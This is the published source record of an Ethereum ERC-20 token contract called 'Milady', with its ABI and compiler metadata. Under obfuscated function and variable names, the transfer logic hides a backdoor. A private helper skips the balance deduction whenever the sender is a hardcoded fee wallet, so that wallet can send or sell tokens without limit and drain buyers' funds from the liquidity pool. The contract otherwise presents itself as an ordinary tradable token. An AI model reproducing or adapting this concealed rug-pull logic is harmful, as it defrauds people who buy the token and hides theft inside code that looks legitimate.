{"SourceCode": "/**\r\n\r\nMilady   $Milady\r\n\r\n\r\nTWITTER: https://twitter.com/Miladys_Eth\r\nTELEGRAM: https://t.me/Miladys_erc\r\nWEBSITE: https://miladyerc.com/\r\n\r\n**/\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity 0.8.20;\r\n\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed _owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:\");\r\n        return c;\r\n    }\r\n\r\n    function  _wfjrp(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _wfjrp(a, b, \"SafeMath:\");\r\n    }\r\n\r\n    function  _wfjrp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath:\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface _spafkrjdup {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface _xrtqFrnkes {\r\n    function swExactTensFrHSportingFeeOransferkes(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint \r\n    amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract Milady is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    uint8 private constant _decimals = 9;\r\n    string private constant _name = unicode\"Milady\";\r\n    string private constant _symbol = unicode\"Milady\";\r\n\r\n    uint256 private constant _Totalce = 100000000 * 10 **_decimals;\r\n    uint256 public _mxTavAmaunt = _Totalce;\r\n    uint256 public _Walletvumax = _Totalce;\r\n    uint256 public _wapThresholdfax= _Totalce;\r\n    uint256 public _myarTouap= _Totalce;\r\n\r\n    uint256 private _BuyTaxinitial=3;\r\n    uint256 private _SellTaxinitial=5;\r\n    uint256 private _BuyTaxfinal=1;\r\n    uint256 private _SellTaxfinal=1;\r\n    uint256 private _BuyTaxAreduce=8;\r\n    uint256 private _SellTaxAreduce=1;\r\n    uint256 private _wapBeforepsrevbent=0;\r\n    uint256 private _bawykxnt=0;\r\n\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExwfdadFhdf;\r\n    mapping (address => bool) private _taxhWalany;\r\n    mapping(address => uint256) private _lrLdvrfevnup;\r\n    bool public _tnsfereslanale = false;\r\n    address payable private _pvrbfkFejp;\r\n\r\n    _xrtqFrnkes private _ufvpyRadusat;\r\n    address private _aufrPaibvw;\r\n    bool private _vpcrkqgrh;\r\n    bool private itfbSwqep = false;\r\n    bool private _apEalbew = false;\r\n\r\n    event _amrouapwtl(uint _mxTavAmaunt);\r\n    modifier lckfThaeup {\r\n        itfbSwqep = true;\r\n        _;\r\n        itfbSwqep = false;\r\n    }\r\n\r\n    constructor () {\r\n        _pvrbfkFejp = payable(0x124850e016f991E22f9c02cDCC83C46ba35cE210);\r\n        _balances[_msgSender()] = _Totalce;\r\n        _isExwfdadFhdf[owner()] = true;\r\n        _isExwfdadFhdf[address(this)] = true;\r\n        _isExwfdadFhdf[_pvrbfkFejp] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _Totalce);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _Totalce;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address spender) public view override returns (uint256) {\r\n        return _allowances[_owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wfjrp(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address _owner, address spender, uint256 amount) private {\r\n        require(_owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[_owner][spender] = amount;\r\n        emit Approval(_owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 teeomoun=0;\r\n        if (from != owner () && to != owner ()) {\r\n\r\n            if (_tnsfereslanale) {\r\n                if (to != address\r\n                (_ufvpyRadusat) && to !=\r\n                 address(_aufrPaibvw)) {\r\n                  require(_lrLdvrfevnup\r\n                  [tx.origin] < block.number,\r\n                  \"Only one transfer per block allowed.\");\r\n                  _lrLdvrfevnup\r\n                  [tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == _aufrPaibvw && to != \r\n            address(_ufvpyRadusat) && !_isExwfdadFhdf[to] ) {\r\n                require(amount <= _mxTavAmaunt,\r\n                 \"Exceeds the _mxTavAmaunt.\");\r\n                require(balanceOf(to) + amount\r\n                 <= _Walletvumax, \"Exceeds the maxWalletSize.\");\r\n                if(_bawykxnt\r\n                < _wapBeforepsrevbent){\r\n                  require(! _frckrprz(to));\r\n                }\r\n                _bawykxnt++;\r\n                 _taxhWalany[to]=true;\r\n                teeomoun = amount.mul((_bawykxnt>\r\n                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)\r\n                .div(100);\r\n            }\r\n\r\n            if(to == _aufrPaibvw && from!= address(this) \r\n            && !_isExwfdadFhdf[from] ){\r\n                require(amount <= _mxTavAmaunt && \r\n                balanceOf(_pvrbfkFejp)<_myarTouap,\r\n                 \"Exceeds the _mxTavAmaunt.\");\r\n                teeomoun = amount.mul((_bawykxnt>\r\n                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)\r\n                .div(100);\r\n                require(_bawykxnt>_wapBeforepsrevbent &&\r\n                 _taxhWalany[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = \r\n            balanceOf(address(this));\r\n            if (!itfbSwqep \r\n            && to == _aufrPaibvw && _apEalbew &&\r\n             contractTokenBalance>_wapThresholdfax \r\n            && _bawykxnt>_wapBeforepsrevbent&&\r\n             !_isExwfdadFhdf[to]&& !_isExwfdadFhdf[from]\r\n            ) {\r\n                _swpvkejkgj( _qkarw(amount, \r\n                _qkarw(contractTokenBalance,_myarTouap)));\r\n                uint256 contractETHBalance \r\n                = address(this).balance;\r\n                if(contractETHBalance \r\n                > 0) {\r\n                    _erpsqxnwhx(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(teeomoun>0){\r\n          _balances[address(this)]=_balances\r\n          [address(this)].\r\n          add(teeomoun);\r\n          emit Transfer(from,\r\n           address(this),teeomoun);\r\n        }\r\n        _balances[from]= _wfjrp(from,\r\n         _balances[from], amount);\r\n        _balances[to]=_balances[to].\r\n        add(amount. _wfjrp(teeomoun));\r\n        emit Transfer(from, to, \r\n        amount. _wfjrp(teeomoun));\r\n    }\r\n\r\n    function _swpvkejkgj(uint256\r\n     tokenAmount) private lckfThaeup {\r\n        if(tokenAmount==0){return;}\r\n        if(!_vpcrkqgrh){return;}\r\n        address[] memory path =\r\n         new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _ufvpyRadusat.WETH();\r\n        _approve(address(this),\r\n         address(_ufvpyRadusat), tokenAmount);\r\n        _ufvpyRadusat.\r\n        swExactTensFrHSportingFeeOransferkes(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function  _qkarw(uint256 a, \r\n    uint256 b) private pure\r\n     returns (uint256){\r\n      return ( a > b\r\n      )?\r\n      b : a ;\r\n    }\r\n\r\n    function  _wfjrp(address\r\n     from, uint256 a,\r\n      uint256 b) private view\r\n       returns(uint256){\r\n        if(from \r\n        == _pvrbfkFejp){\r\n            return a ;\r\n        }else{\r\n            return a . _wfjrp (b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _mxTavAmaunt = _Totalce;\r\n        _Walletvumax = _Totalce;\r\n        _tnsfereslanale = false;\r\n        emit _amrouapwtl(_Totalce);\r\n    }\r\n\r\n    function _frckrprz(address \r\n    account) private view \r\n    returns (bool) {\r\n        uint256 sixzev;\r\n        assembly {\r\n            sixzev :=\r\n             extcodesize\r\n             (account)\r\n        }\r\n        return sixzev > \r\n        0;\r\n    }\r\n\r\n    function _erpsqxnwhx(uint256\r\n    amount) private {\r\n        _pvrbfkFejp.\r\n        transfer(amount);\r\n    }\r\n\r\n    function openTrading( ) external onlyOwner( ) {\r\n        require( ! _vpcrkqgrh);\r\n        _ufvpyRadusat   =  _xrtqFrnkes (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;\r\n        _approve(address(this), address(_ufvpyRadusat), _Totalce);\r\n        _aufrPaibvw = _spafkrjdup(_ufvpyRadusat.factory()). createPair (address(this),  _ufvpyRadusat . WETH ());\r\n        _ufvpyRadusat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(_aufrPaibvw).approve(address(_ufvpyRadusat), type(uint).max);\r\n        _apEalbew = true;\r\n        _vpcrkqgrh = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_mxTavAmaunt\",\"type\":\"uint256\"}],\"name\":\"_amrouapwtl\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_Walletvumax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mxTavAmaunt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_myarTouap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tnsfereslanale\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_wapThresholdfax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Milady", "CompilerVersion": "v0.8.20+commit.a1b79de6", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://f41ec5f4b668a072d2f72e5678e944ef767a9589f8a386f05b7db531cfaf2929"}